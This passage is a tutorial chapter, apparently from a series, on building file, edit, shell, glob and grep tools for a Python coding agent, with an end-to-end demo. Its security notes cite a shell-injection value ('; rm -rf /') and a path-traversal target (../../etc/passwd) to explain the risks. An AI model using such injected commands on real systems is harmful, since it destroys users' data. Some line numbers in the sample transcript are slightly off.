# Phase 4 — Real-World Tools (the Claude-Code Toolset)

> **Series context:** Phases 0–3 built the agent loop, the tool registry with the
> `@tool` decorator and `Registry` class, and streaming. This phase fills the registry
> with the tools that make a coding agent actually useful: filesystem reads and writes,
> surgical edits, shell execution, glob, grep, and directory listing. Every tool is pure
> Python stdlib. No frameworks, no third-party packages beyond `openai`.

---

> ## 🟢 Beginner track: good news — this phase is mostly plain functions
>
> Each tool below (`read_file`, `write_file`, `bash`, `grep`, …) is **an ordinary
> function** built from things you know: `if`/`else`, `for`, lists, dicts, string
> operators, and `return`. You can read every tool body directly. A few heads-ups so
> nothing trips you up:
>
> - **`@tool` above each function** is the decorator from
>   [Phase 2](./02-tool-system.md#-beginner-track-the-same-tool-system-using-only-functions--dicts).
>   It only auto-writes the schema dict. You can delete the `@tool` lines and register
>   each function the simple way — `register("read_file", read_file, read_file_schema)`
>   with a hand-written schema dict — exactly as in the Phase 2 beginner box. The
>   function bodies don't change at all.
> - **`pathlib.Path`** is the standard way to handle file paths. `p = Path("src/a.py")`
>   makes a path *object*; then `p.exists()`, `p.read_text()`, `p.is_file()` are
>   methods that ask/do things with it. Read `p.read_text()` as "read this file's text."
>   It's an object with handy functions attached — nothing more.
> - **`key=lambda e: e.name.lower()`** (in the `sorted(...)` calls). A `lambda` is just
>   a one-line function with no name. `lambda e: e.name.lower()` is the same as defining
>   `def f(e): return e.name.lower()` and passing `f`. Here it tells `sorted` to order
>   entries by their lowercased name.
> - **Fancy f-strings** like `f"{n:.0f}"` or `f"{e.name:<40s}"` just control formatting
>   (decimal places, column width). The `{...}` still means "drop a value in here"; the
>   part after `:` is cosmetic. You can ignore the details.
> - **`try:` / `except:`** appears throughout — see the
>   [Phase 1 box](./01-bare-harness.md) if you need the refresher: "try this; if it
>   errors, return an error string instead of crashing."
>
> With those five notes, the entire phase is readable with your five concepts.

---

## 1. Why Tools Define the Agent's Power

The loop from Phase 1 is the skeleton. Tools are the muscles. A model that can only
reason about code it has seen in its context window is helpless against a real codebase.
Give it `read_file` and it can inspect any source file. Give it `edit_file` and it can
make precise surgical changes. Give it `bash` and it can run tests, install packages,
and observe the results. The combination is what makes Claude Code — and what we are
building here — feel like a capable pair-programmer rather than a sophisticated autocomplete.

### 1.1 Design Principles for Agent Tools

These principles apply to every tool in this phase and to any tool you will write in the
future. They are not suggestions; violating them reliably produces broken agents.

**(a) Clear, model-facing descriptions.**
The model decides when and how to call a tool based entirely on its `description` string
and its parameter docstrings. A vague description produces wrong or missed calls. Every
tool here has a description written as if you were explaining the function to a competent
engineer who cannot see its source code. Include: what it does, what it returns, what
parameters are optional and what their defaults mean, and what happens on error.

**(b) Return concise but sufficient output.**
The model must read the tool result and reason about it. More text is not always better;
a wall of irrelevant output crowds out useful context. Each tool returns the minimum
information needed for the model to take the next correct action.

**(c) Deterministic and idempotent where possible.**
`read_file` always returns the same bytes for the same path. `glob` returns a sorted,
stable list. `write_file` is idempotent on identical content. Non-determinism in tools
causes the model to produce non-deterministic reasoning, which is hard to debug.

**(d) Fail with actionable error strings.**
Tools never raise exceptions into the loop (Phase 2 contract). When something goes wrong
the tool returns a string starting with `"ERROR: "` that tells the model exactly what
happened and, where possible, how to recover. `"ERROR: File not found: /src/foo.py"` is
actionable. `"Something went wrong"` is not.

**(e) Guard against pathologically large output.**
A file with 500,000 lines will blow up the context window if returned verbatim. Every
tool that reads file contents or command output passes through a shared `_truncate()`
helper that caps both character count and line count. The truncation message is visible
to the model so it knows to ask for a slice.

**(f) Path safety: resolve within the workspace root.**
An agent running shell commands and writing files is a code-execution sandbox. Without
path guards, a malicious or confused model can write to `../../etc/passwd` or read
secrets outside the project. Every path-taking tool calls `_safe_path()` which resolves
the path and asserts it stays within `WORKSPACE_ROOT`.

---

## 2. Module Layout and Shared Utilities

All tools live in a single module `tools.py`. At the top of the module we establish the
workspace root, the two shared helpers, and the imports.

```python
# tools.py
"""
Phase 4 — Real-world tools for a coding agent.

All tools use the @tool decorator and Registry from Phase 2.
All I/O is pure stdlib. No third-party packages.
"""

from __future__ import annotations

import json
import os
import pathlib
import re
import subprocess
import sys
from typing import Optional

from registry import tool, Registry   # Phase 2 artefacts

# ---------------------------------------------------------------------------
# Workspace root
# ---------------------------------------------------------------------------
# Every path argument is resolved relative to WORKSPACE_ROOT.  Set this to
# the project directory the agent is allowed to operate in.  It defaults to
# the current working directory at import time.
#
# Override before calling make_default_registry():
#   import tools; tools.WORKSPACE_ROOT = pathlib.Path("/my/project")

WORKSPACE_ROOT: pathlib.Path = pathlib.Path(os.getcwd()).resolve()
```

### 2.1 `_safe_path` — the Path Guard

```python
def _safe_path(user_path: str) -> pathlib.Path:
    """
    Resolve *user_path* relative to WORKSPACE_ROOT and verify it does not
    escape the workspace.

    Raises ValueError with an actionable message if the resolved path would
    sit outside WORKSPACE_ROOT.  Tools catch this and return the error string.

    Uses Path.resolve() which follows symlinks and collapses '..' sequences,
    so there is no way to sneak past the guard with clever relative paths.
    """
    # Treat absolute paths as relative to the workspace root so the model
    # can write "/src/foo.py" meaning "<root>/src/foo.py".
    p = pathlib.Path(user_path)
    if p.is_absolute():
        # Strip the leading "/" and re-root under WORKSPACE_ROOT.
        # pathlib.Path("/a") / pathlib.Path("/b") == pathlib.Path("/b")
        # so we must do this explicitly.
        rel = pathlib.Path(*p.parts[1:])
        p = WORKSPACE_ROOT / rel
    else:
        p = WORKSPACE_ROOT / p

    resolved = p.resolve()

    try:
        resolved.relative_to(WORKSPACE_ROOT)
    except ValueError:
        raise ValueError(
            f"Path '{user_path}' resolves to '{resolved}' which is outside "
            f"the workspace root '{WORKSPACE_ROOT}'. "
            "Use paths relative to the workspace root."
        )
    return resolved
```

> **Why `Path.resolve()` and not string manipulation?**
> `os.path.normpath` collapses `..` in the string but does *not* follow symlinks.
> A symlink at `workspace/link -> /etc` would pass a naive string check. `Path.resolve()`
> actually walks the filesystem, so a symlink pointing outside the workspace is caught.
> The cost is an extra syscall per path; that is entirely acceptable.

### 2.2 `_truncate` — the Output Size Guard

```python
_DEFAULT_MAX_CHARS = 40_000    # ~10 k tokens at 4 chars/token — generous but bounded
_DEFAULT_MAX_LINES = 2_000

def _truncate(
    text: str,
    max_chars: int = _DEFAULT_MAX_CHARS,
    max_lines: int = _DEFAULT_MAX_LINES,
    label: str = "output",
) -> str:
    """
    Truncate *text* to at most *max_lines* lines and *max_chars* characters,
    whichever limit is hit first.

    Appends a visible truncation notice so the model knows output was cut.
    """
    lines = text.splitlines(keepends=True)
    if len(lines) > max_lines:
        lines = lines[:max_lines]
        text = "".join(lines)
        text += f"\n[... {label} truncated at {max_lines} lines ...]"
    if len(text) > max_chars:
        text = text[:max_chars]
        text += f"\n[... {label} truncated at {max_chars} chars ...]"
    return text
```

**Why this exists and why it matters for context economics.**
Every character a tool returns consumes context-window tokens that the model cannot use
for reasoning. A naive `cat` of a 10 MB log file does not just slow things down — it
silently discards early conversation history once the context fills, causing the model to
forget its own plan. Phase 6 covers context compaction in depth; for now, `_truncate`
is the first and cheapest line of defence. The truncation notice is intentionally visible
to the model so it can request a slice rather than silently operating on incomplete data.

---

## 3. The Tools

### 3.1 `read_file`

```python
@tool
def read_file(path: str, offset: int = 0, limit: int = 2000) -> str:
    """
    Read a text file and return its contents with line numbers.

    Args:
        path:   Path to the file, relative to the workspace root.
        offset: First line to return (0-indexed).  Default 0 (start of file).
        limit:  Maximum number of lines to return.  Default 2000.

    Returns:
        File contents formatted as 'lineN\\tcontent', one line per row — the
        same format as `cat -n`.  If the file is missing, unreadable, or
        appears to be binary, returns an ERROR string.

    Use offset/limit to page through large files:
        read_file("big.log", offset=2000, limit=2000)   # lines 2000-3999
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"

    # Read raw bytes first so we can detect binary files cheaply.
    try:
        raw = p.read_bytes()
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"

    # Heuristic binary check: any null bytes in the first 8 KB → binary.
    if b"\x00" in raw[:8192]:
        size = len(raw)
        return (
            f"ERROR: '{path}' appears to be a binary file ({size} bytes). "
            "Use bash('xxd ...') or bash('file ...') to inspect it."
        )

    text = raw.decode("utf-8", errors="replace")
    lines = text.splitlines()
    total = len(lines)

    # Apply offset/limit slice.
    sliced = lines[offset : offset + limit]
    if not sliced:
        return (
            f"File '{path}' has {total} lines. "
            f"offset={offset} is past the end of the file."
        )

    # Format with line numbers (1-indexed, matching editor conventions).
    _LINE_NUM_WIDTH = len(str(offset + len(sliced)))
    numbered = "\n".join(
        f"{offset + i + 1:{_LINE_NUM_WIDTH}d}\t{line}"
        for i, line in enumerate(sliced)
    )

    header = f"File: {path}  (lines {offset + 1}–{offset + len(sliced)} of {total})\n"
    result = header + numbered

    return _truncate(result, label=f"read_file({path})")
```

**Design note — why line numbers?**
The `edit_file` tool (next section) uses exact string matching, not line numbers. But the
model still needs line numbers to reason about its own edits: "the function starts at line
42, so the `old_string` I should use is lines 42–55". Without numbers the model must count
manually and frequently miscounts in long files. Line numbers also let the model construct
precise `old_string` values that are unique by virtue of being large enough to cover the
surrounding context.

**Design note — offset/limit pagination.**
A model that wants to read a 10,000-line file does not need all 10,000 lines at once.
The `offset` and `limit` parameters let it scan in windows, requesting only the region
it cares about. The tool itself caps the returned text with `_truncate` as a backstop,
but idiomatic agent usage is to request a small window first and page forward as needed.

---

### 3.2 `write_file`

```python
@tool
def write_file(path: str, content: str) -> str:
    """
    Write content to a file, creating it (and any parent directories) if it
    does not exist.  Overwrites the file completely if it does exist.

    Args:
        path:    Path to the file, relative to the workspace root.
        content: Full text content to write.  UTF-8 encoded.

    Returns:
        A confirmation string showing the number of bytes and lines written,
        or an ERROR string if the write failed.

    WARNING: This is a destructive operation.  The previous file contents are
    not recoverable once overwritten.  For targeted changes to an existing file
    prefer edit_file(), which performs a surgical replacement and verifies the
    old content exists before writing.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        encoded = content.encode("utf-8")
        p.write_bytes(encoded)
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"

    lines = content.count("\n")
    return (
        f"Wrote {len(encoded)} bytes ({lines} lines) to '{path}'."
    )
```

**Design note — destructiveness and Phase 5 permissions.**
`write_file` will silently destroy whatever was in the file before. This is correct
behaviour for creating new files but dangerous for existing ones. Phase 5 introduces
a **permissions layer** that intercepts write operations on files the user has not
explicitly approved, surfacing a confirmation prompt before any bytes are written.
For now, the tool is intentionally raw so we can focus on its mechanics without
conflating it with the permission system.

---

### 3.3 `edit_file` — the Surgical Edit Tool

```python
@tool
def edit_file(
    path: str,
    old_string: str,
    new_string: str,
    replace_all: bool = False,
) -> str:
    """
    Replace an exact string in a file with a new string.

    The tool reads the file, verifies that old_string appears in the content,
    and writes the file back with old_string replaced by new_string.

    Args:
        path:        Path to the file, relative to the workspace root.
        old_string:  The exact text to find and replace.  Must match the file
                     contents character-for-character, including whitespace and
                     indentation.  Include enough surrounding context (e.g. the
                     full function signature plus a few lines) to make the match
                     unique.
        new_string:  The text to substitute in place of old_string.
        replace_all: If False (default), the tool returns an error if old_string
                     appears more than once in the file — ambiguous edits are
                     rejected.  If True, all occurrences are replaced.

    Returns:
        A confirmation string, or one of:
          ERROR: File not found          — path does not exist
          ERROR: old_string not found    — no match; check whitespace/indentation
          ERROR: old_string is ambiguous — N matches found, replace_all=False
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"

    try:
        original = p.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"

    count = original.count(old_string)

    if count == 0:
        # Give the model actionable guidance.
        snippet = repr(old_string[:120]) + ("..." if len(old_string) > 120 else "")
        return (
            f"ERROR: old_string not found in '{path}'.\n"
            f"Searched for: {snippet}\n"
            "Check that whitespace and indentation exactly match the file contents. "
            "Use read_file() to inspect the exact bytes."
        )

    if count > 1 and not replace_all:
        return (
            f"ERROR: old_string is ambiguous — found {count} occurrences in '{path}'. "
            "Provide more surrounding context to make old_string unique, "
            "or pass replace_all=True to replace every occurrence."
        )

    updated = original.replace(old_string, new_string)

    try:
        p.write_text(updated, encoding="utf-8")
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"

    replacements = count if replace_all else 1
    lines_before = original.count("\n")
    lines_after = updated.count("\n")
    delta = lines_after - lines_before
    delta_str = f"+{delta}" if delta >= 0 else str(delta)
    return (
        f"Edited '{path}': replaced {replacements} occurrence(s). "
        f"File now has {lines_after + 1} lines ({delta_str} from before)."
    )
```

**Why exact-match string replacement beats line-number patches.**

Line-number patches (`diff` / `patch` format) seem natural — you say "replace lines
42–55 with this block". But they are fragile in an agentic context:

- The model's mental model of line numbers can drift between tool calls (an earlier
  edit shifts every subsequent line number by N).
- If two tool calls run close together and both reference the same region, one can
  silently corrupt the other's target.
- The model often miscounts lines when composing a patch over a long context.

Exact-match string replacement anchors the edit to *content*, not *position*. As long
as the old string is present and unique, the edit is correct regardless of what other
edits ran before it. The uniqueness check is load-bearing: if `old_string` matches in
two places, we do not know which one the model intended, so we reject the operation and
ask for more context. This is a conservative, correct default.

Claude Code uses this exact approach. The technique is sometimes called
**positional-free patching** or **semantic patching**.

---

### 3.4 `bash` — Shell Command Execution

```python
@tool
def bash(command: str, timeout: int = 120) -> str:
    """
    Run a shell command and return its output (stdout and stderr combined).

    Args:
        command: The shell command to execute.  Runs under /bin/sh so shell
                 features (pipes, redirects, &&, subshells) work normally.
        timeout: Maximum seconds to wait for the command to finish.  Default
                 120.  Commands that exceed this are killed and an error is
                 returned.

    Returns:
        A string of the form:
            Exit code: 0
            ---
            <combined stdout + stderr>

        On timeout:
            ERROR: Command timed out after N seconds: <command>

    IMPORTANT — SECURITY:
        This tool executes arbitrary shell commands with the permissions of the
        agent process.  Do not expose it to untrusted input without a permission
        layer (Phase 5).  It runs with shell=True so shell injection is possible
        if user-supplied data is interpolated into the command string.

    IMPORTANT — BLOCKING:
        Interactive commands (e.g. 'python3 -i', 'vim') will hang until the
        timeout fires because stdin is closed.  Use non-interactive invocations:
        'python3 script.py' not 'python3 -i'.

    Working directory:
        Commands run with cwd=WORKSPACE_ROOT so relative paths in the command
        work as expected within the project.
    """
    try:
        result = subprocess.run(
            command,
            shell=True,                   # We want a real shell for pipes etc.
            cwd=str(WORKSPACE_ROOT),
            stdin=subprocess.DEVNULL,     # Never block waiting for input.
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,     # Merge stderr into stdout.
            timeout=timeout,
            # Do NOT use text=True here; some commands emit binary (e.g. xxd).
            # Decode ourselves with errors='replace'.
        )
        output = result.stdout.decode("utf-8", errors="replace")
        output = _truncate(output, label=f"bash({command[:60]})")
        return f"Exit code: {result.returncode}\n---\n{output}"

    except subprocess.TimeoutExpired:
        return f"ERROR: Command timed out after {timeout} seconds: {command}"
    except OSError as exc:
        return f"ERROR: Failed to start command: {exc}"
```

**The big danger: `shell=True`.**

`subprocess.run(..., shell=True)` passes the command string to `/bin/sh -c`. This is
exactly what we want — shell pipelines, redirection, variable expansion, and compound
commands all work. But it means **every character of `command` is interpreted by the
shell**. If the model ever constructs a command by interpolating untrusted user input,
shell injection is trivially possible:

```python
# DANGEROUS if user_input comes from outside the agent:
bash(f"grep {user_input} /src/main.py")
# A user_input of '; rm -rf /' becomes a catastrophe.
```

In a coding agent the model constructs the commands, and the model is (mostly) trusted.
But Phase 5 introduces a permission system that shows the user every `bash` call before
it runs. That second pair of eyes is the real safety net — `shell=True` vs `shell=False`
is a secondary concern. Document the risk loudly; do not paper over it.

**Interactive commands and stdin.**

`stdin=subprocess.DEVNULL` closes stdin immediately. Any command that tries to read
from stdin will see EOF and exit (or error). This is correct: an interactive Python
REPL waiting for input would block until the `timeout` fires, burning 120 seconds and
returning nothing useful. The model should know to use `python3 script.py` not
`python3 -i`, and the docstring says so.

**Working directory.**

Setting `cwd=WORKSPACE_ROOT` means the model can write `bash("ls src/")` and get the
right listing without needing to know the absolute path. It mirrors how a developer
would open a terminal in the project root.

---

### 3.5 `glob`

```python
@tool
def glob(pattern: str, path: str = ".") -> str:
    """
    Find files matching a glob pattern.

    Args:
        pattern: A glob pattern, e.g. '**/*.py', '*.md', 'src/**/*.ts'.
                 Use '**' for recursive matching.
        path:    Directory to search in, relative to workspace root.
                 Default '.' (workspace root).

    Returns:
        A sorted, newline-separated list of matching paths relative to the
        workspace root.  Returns a message if no files match.  Caps at 500
        results.
    """
    _MAX_RESULTS = 500

    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not base.exists():
        return f"ERROR: Directory not found: {path}"
    if not base.is_dir():
        return f"ERROR: Not a directory: {path}"

    try:
        # rglob handles '**'; plain glob handles the rest.
        if "**" in pattern:
            matches = list(base.rglob(pattern.lstrip("**/").lstrip("/")))
        else:
            matches = list(base.glob(pattern))
    except (OSError, ValueError) as exc:
        return f"ERROR: Glob failed: {exc}"

    # Keep only files (not directories) and sort for determinism.
    file_matches = sorted(
        [m for m in matches if m.is_file()],
        key=lambda p: str(p),
    )

    truncated = False
    if len(file_matches) > _MAX_RESULTS:
        file_matches = file_matches[:_MAX_RESULTS]
        truncated = True

    if not file_matches:
        return f"No files match pattern '{pattern}' under '{path}'."

    # Return paths relative to workspace root for readability.
    rel_paths = []
    for m in file_matches:
        try:
            rel_paths.append(str(m.relative_to(WORKSPACE_ROOT)))
        except ValueError:
            rel_paths.append(str(m))

    result = "\n".join(rel_paths)
    if truncated:
        result += f"\n[... capped at {_MAX_RESULTS} results ...]"
    return result
```

**Why a dedicated `glob` tool?**

The alternative is `bash("find . -name '*.py'")`. That works but has two problems:
(1) the model must remember `find` syntax, which varies between Linux and macOS;
(2) every `bash` call is a subprocess fork with a Phase 5 permission prompt in
production. `glob` is pure Python, instant, and safe — no subprocess, no shell, no
permission needed. Reserve `bash` for operations that genuinely require the shell.

---

### 3.6 `grep`

```python
@tool
def grep(pattern: str, path: str = ".", glob_filter: str = None) -> str:
    """
    Search file contents for a regular expression pattern.

    Args:
        pattern:     Python re pattern to search for.  Case-sensitive by
                     default.  Wrap in (?i) for case-insensitive.
        path:        File or directory to search, relative to workspace root.
                     If a file, searches that file only.
                     If a directory, searches recursively.  Default '.'.
        glob_filter: If given, only files whose name matches this glob are
                     searched, e.g. '*.py', '*.{ts,tsx}'.  Only the filename
                     (not the full path) is matched.

    Returns:
        Matching lines in the format 'filepath:linenum: line content', one
        per row — the same format as grep -n.  Returns a message if no
        matches.  Caps at 200 matching lines.
    """
    _MAX_RESULTS = 200
    _MAX_FILE_BYTES = 5 * 1024 * 1024  # Skip files larger than 5 MB.

    try:
        compiled = re.compile(pattern)
    except re.error as exc:
        return f"ERROR: Invalid regex pattern: {exc}"

    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not base.exists():
        return f"ERROR: Path not found: {path}"

    # Collect files to search.
    if base.is_file():
        files_to_search = [base]
    else:
        files_to_search = [f for f in base.rglob("*") if f.is_file()]

    # Apply glob filter on filename (not full path).
    if glob_filter:
        import fnmatch
        files_to_search = [
            f for f in files_to_search
            if fnmatch.fnmatch(f.name, glob_filter)
        ]

    files_to_search = sorted(files_to_search, key=lambda p: str(p))

    results = []
    skipped_binary = 0
    skipped_large = 0

    for filepath in files_to_search:
        if len(results) >= _MAX_RESULTS:
            break

        # Skip large files.
        try:
            size = filepath.stat().st_size
        except OSError:
            continue
        if size > _MAX_FILE_BYTES:
            skipped_large += 1
            continue

        # Read and decode.
        try:
            raw = filepath.read_bytes()
        except OSError:
            continue

        # Skip binary files.
        if b"\x00" in raw[:8192]:
            skipped_binary += 1
            continue

        text = raw.decode("utf-8", errors="replace")

        # Search line by line.
        for lineno, line in enumerate(text.splitlines(), start=1):
            if len(results) >= _MAX_RESULTS:
                break
            if compiled.search(line):
                try:
                    rel = str(filepath.relative_to(WORKSPACE_ROOT))
                except ValueError:
                    rel = str(filepath)
                # Truncate very long matching lines to keep output readable.
                display_line = line[:300] + ("..." if len(line) > 300 else "")
                results.append(f"{rel}:{lineno}: {display_line}")

    if not results:
        msg = f"No matches for pattern '{pattern}'"
        if glob_filter:
            msg += f" in files matching '{glob_filter}'"
        msg += f" under '{path}'."
        return msg

    output = "\n".join(results)
    suffix_parts = []
    if len(results) >= _MAX_RESULTS:
        suffix_parts.append(f"results capped at {_MAX_RESULTS}")
    if skipped_binary:
        suffix_parts.append(f"{skipped_binary} binary file(s) skipped")
    if skipped_large:
        suffix_parts.append(f"{skipped_large} large file(s) (>{_MAX_FILE_BYTES // 1024 // 1024} MB) skipped")
    if suffix_parts:
        output += "\n[" + "; ".join(suffix_parts) + "]"

    return output
```

**Why a built-in `grep` beats `bash("grep -rn ...")`.**

Same argument as for `glob`, but stronger: the model needs to search file contents
constantly (finding a function definition, locating a TODO, understanding an import
graph). Every `bash` grep is a subprocess fork, a shell parse, and — in production — a
permission prompt. The built-in `grep` tool is:

- **Instant** — pure Python, no subprocess.
- **Safe** — no command injection, no shell.
- **Portable** — works identically on Linux and macOS.
- **Controlled** — the result cap and binary/large-file skipping are enforced
  regardless of how the model calls it.

The tradeoff is that it does not support the full `grep` flag set (e.g., `-l`, `-v`,
`--include`). For advanced filtering the model can fall back to `bash("grep ...")`.

---

### 3.7 `list_dir`

```python
@tool
def list_dir(path: str = ".") -> str:
    """
    List the contents of a directory.

    Args:
        path: Path to the directory, relative to the workspace root.
              Default '.' (workspace root).

    Returns:
        One entry per line: '[type] name  (size)' where type is 'F' for file
        or 'D' for directory.  Sorted alphabetically, directories first.
        Returns an ERROR string if path does not exist or is not a directory.
    """
    _MAX_ENTRIES = 300

    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not p.exists():
        return f"ERROR: Directory not found: {path}"
    if not p.is_file():
        # It's a directory — proceed.
        pass
    if p.is_file():
        return f"ERROR: '{path}' is a file, not a directory. Use read_file() to read it."

    try:
        entries = list(p.iterdir())
    except PermissionError as exc:
        return f"ERROR: Permission denied: {exc}"
    except OSError as exc:
        return f"ERROR: Cannot list directory: {exc}"

    dirs = sorted([e for e in entries if e.is_dir()], key=lambda e: e.name.lower())
    files = sorted([e for e in entries if e.is_file()], key=lambda e: e.name.lower())
    ordered = dirs + files

    truncated = False
    if len(ordered) > _MAX_ENTRIES:
        ordered = ordered[:_MAX_ENTRIES]
        truncated = True

    lines = []
    for entry in ordered:
        if entry.is_dir():
            lines.append(f"D  {entry.name}/")
        else:
            try:
                size = entry.stat().st_size
                size_str = _human_size(size)
            except OSError:
                size_str = "?"
            lines.append(f"F  {entry.name:<40s}  {size_str:>8s}")

    header = f"Directory: {path}  ({len(dirs)} dirs, {len(files)} files)\n"
    result = header + "\n".join(lines)
    if truncated:
        result += f"\n[... capped at {_MAX_ENTRIES} entries ...]"
    return result


def _human_size(n: int) -> str:
    """Format byte count as a human-readable string."""
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"
```

---

## 4. Registering Everything: `make_default_registry`

```python
def make_default_registry(workspace: pathlib.Path = None) -> Registry:
    """
    Return a Registry pre-loaded with all coding-agent tools.

    Args:
        workspace: Override WORKSPACE_ROOT for this session.  If None, the
                   module-level WORKSPACE_ROOT (defaulting to cwd) is used.

    Usage:
        from tools import make_default_registry
        registry = make_default_registry(pathlib.Path("/my/project"))
        # Pass registry.tools_list() to client.responses.create(tools=...)
        # Pass registry.dispatch(name, args) to handle tool calls.
    """
    global WORKSPACE_ROOT
    if workspace is not None:
        WORKSPACE_ROOT = workspace.resolve()

    registry = Registry()
    for fn in (read_file, write_file, edit_file, bash, glob, grep, list_dir):
        registry.register(fn)
    return registry
```

The `Registry` class from Phase 2 already knows how to produce the flat tool-schema
list and dispatch by name. All we do here is register every `@tool`-decorated function.
The `@tool` decorator extracted the JSON schema from type hints and the docstring when
the function was defined, so there is nothing more to do.

---

## 5. Toolset Reference Table

| Tool | Signature | Purpose | Risk level |
|------|-----------|---------|------------|
| `read_file` | `(path, offset=0, limit=2000)` | Read text file with line numbers, support paging | Low |
| `write_file` | `(path, content)` | Create or overwrite a file entirely | Medium — destructive |
| `edit_file` | `(path, old_string, new_string, replace_all=False)` | Surgical exact-match replacement | Medium — destructive |
| `bash` | `(command, timeout=120)` | Execute any shell command | **High** — arbitrary execution |
| `glob` | `(pattern, path=".")` | Find files by glob pattern | Low |
| `grep` | `(pattern, path=".", glob_filter=None)` | Search file contents by regex | Low |
| `list_dir` | `(path=".")` | List directory contents | Low |

---

## 6. End-to-End Demo

The following demo wires the tool registry into the Phase 3 streaming loop and sends
the agent a real task: find all TODO comments in a small project and summarize them.

### 6.1 Setup

```python
# demo_phase4.py
"""
End-to-end demo: an agent finds and summarizes TODO comments in a project.

Prerequisites:
  pip install openai
  export OPENAI_API_KEY=sk-...
"""

import pathlib
import tempfile
import textwrap
import json
import os

from openai import OpenAI
from registry import Registry   # Phase 2
from tools import make_default_registry

# ── Create a toy project for the agent to explore ────────────────────────────

def create_sample_project(root: pathlib.Path) -> None:
    """Write a few Python files with TODO comments."""
    (root / "src").mkdir()
    (root / "tests").mkdir()

    (root / "src" / "auth.py").write_text(textwrap.dedent("""\
        # TODO: add rate limiting to login endpoint
        def login(username, password):
            # TODO: hash the password before comparing
            return username == "admin" and password == "secret"

        def logout(session_id):
            pass  # TODO: invalidate session in Redis
    """))

    (root / "src" / "api.py").write_text(textwrap.dedent("""\
        # TODO: switch to async handlers for better throughput
        def handle_request(req):
            return {"status": "ok"}
    """))

    (root / "tests" / "test_auth.py").write_text(textwrap.dedent("""\
        from src.auth import login

        def test_login_ok():
            assert login("admin", "secret")

        # TODO: add negative test cases
    """))

    (root / "README.md").write_text("# Sample Project\n")
```

### 6.2 The Agent Loop

```python
def run_demo():
    client = OpenAI()

    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir)
        create_sample_project(root)

        registry = make_default_registry(workspace=root)

        system_prompt = (
            "You are a coding assistant operating on a Python project. "
            "Use the available tools to explore the codebase. "
            "When you have gathered all the information you need, "
            "produce a final answer — do not call any more tools after that."
        )

        task = (
            "Find every TODO comment in this project's source files and "
            "produce a concise summary grouped by file. "
            "Then suggest which TODO is most urgent and why."
        )

        input_items = [
            {"role": "user", "content": task},
        ]

        print(f"TASK: {task}\n{'='*60}")

        iteration = 0
        max_iterations = 20

        while iteration < max_iterations:
            iteration += 1

            resp = client.responses.create(
                model="gpt-4o",
                instructions=system_prompt,
                input=input_items,
                tools=registry.tools_list(),
                tool_choice="auto",
            )

            # Append the model's output to the transcript.
            for item in resp.output:
                input_items.append(
                    item.model_dump() if hasattr(item, "model_dump") else item
                )

            # Check for tool calls.
            tool_calls = [
                item for item in resp.output
                if getattr(item, "type", None) == "function_call"
            ]

            if not tool_calls:
                # No tool calls → the model produced a final answer.
                for item in resp.output:
                    if getattr(item, "type", None) == "message":
                        for block in item.content:
                            if getattr(block, "type", None) == "output_text":
                                print(f"\nAGENT ANSWER:\n{block.text}")
                break

            # Execute each tool call and append results.
            for tc in tool_calls:
                args = json.loads(tc.arguments) if isinstance(tc.arguments, str) else tc.arguments
                print(f"\n[Tool call] {tc.name}({json.dumps(args, ensure_ascii=False)[:120]})")
                result = registry.dispatch(tc.name, args)
                preview = result[:200].replace("\n", " ")
                print(f"[Result]   {preview}{'...' if len(result) > 200 else ''}")

                input_items.append({
                    "type": "function_call_output",
                    "call_id": tc.call_id,
                    "output": result,
                })

        if iteration >= max_iterations:
            print("ERROR: max_iterations reached without a final answer.")


if __name__ == "__main__":
    run_demo()
```

### 6.3 Transcript (representative output)

The exact sequence varies by model run, but a typical execution looks like this:

```text
TASK: Find every TODO comment in this project's source files and produce a
concise summary grouped by file. Then suggest which TODO is most urgent and why.
============================================================

[Tool call] list_dir({"path": "."})
[Result]   Directory: .  (2 dirs, 1 files)  D  src/  D  tests/  F  README.md ...

[Tool call] grep({"pattern": "TODO", "path": ".", "glob_filter": "*.py"})
[Result]   src/auth.py:1: # TODO: add rate limiting to login endpoint  src/auth.py:3: ...

[Tool call] read_file({"path": "src/auth.py"})
[Result]   File: src/auth.py  (lines 1–7 of 7)    1  # TODO: add rate limiting ...

AGENT ANSWER:
## TODO Summary

**src/auth.py** (3 TODOs)
- Line 1: Add rate limiting to the login endpoint
- Line 3: Hash the password before comparing (currently stored in plaintext)
- Line 6: Invalidate session in Redis on logout

**src/api.py** (1 TODO)
- Line 1: Switch to async handlers for better throughput

**tests/test_auth.py** (1 TODO)
- Line 7: Add negative test cases for login

---
**Most urgent:** `src/auth.py` line 3 — comparing passwords without hashing is a
critical security vulnerability. Any data breach would expose credentials in plaintext.
This should be fixed before any of the other items.
```

Notice the tool-call sequence: `list_dir` first (orient in the workspace), then `grep`
(find all matches in one call rather than reading every file), then a targeted
`read_file` for context. A well-prompted model with good tools naturally follows an
efficient search strategy.

---

## 7. Output-Size Discipline (Deep Dive)

The `_truncate` helper appears in every tool that reads file contents or command output.
This section explains why it is non-negotiable.

### 7.1 The Context-Window Economy

Every token in the context window is a shared resource competed for by:

- The system prompt (sets behaviour).
- The conversation history (gives context).
- Tool call arguments (the model's intent).
- **Tool results (what we control).**
- The model's reasoning and output (what we want).

When tool results are large, they crowd out everything else. A single `cat` of a 50,000-
line file consumes ~50,000 tokens — the entire context window of GPT-3.5, most of
